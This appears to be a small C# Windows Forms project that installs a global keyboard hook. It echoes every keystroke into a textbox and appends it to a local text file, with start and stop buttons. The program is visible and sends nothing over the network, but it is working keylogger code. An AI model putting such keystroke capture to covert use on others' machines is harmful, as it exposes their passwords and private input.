using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace KeyboardHook
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        GlobalKeyboardHook gHook;
        //string loc = @"C:\Users\mille\Desktop\KeyboardHook\file.txt";
        //StreamWriter writer = new StreamWriter(@"C:\Users\mille\Desktop\KeyboardHook\file.txt", true);
        private void Form1_Load(object sender, EventArgs e)
        {
            gHook = new GlobalKeyboardHook();
            gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                gHook.HookedKeys.Add(key);
        }

        public void gHook_KeyDown(object sender, KeyEventArgs e)
        {
            textBox1.Text += ((char)e.KeyValue).ToString();
            string txt = ((char)e.KeyValue).ToString();


            using (StreamWriter writer = File.AppendText(@"C:\Users\mille\Desktop\KeyboardHook\file.txt"))
            {
                writer.WriteLine(txt);
            }
            //string txt = textBox1.Text;


            //writer.WriteLine(txt );
        }

        private void button1_Click(object sender, EventArgs e)
        {
            gHook.hook();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            gHook.unhook();
           
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            gHook.unhook();
        }
    }
}
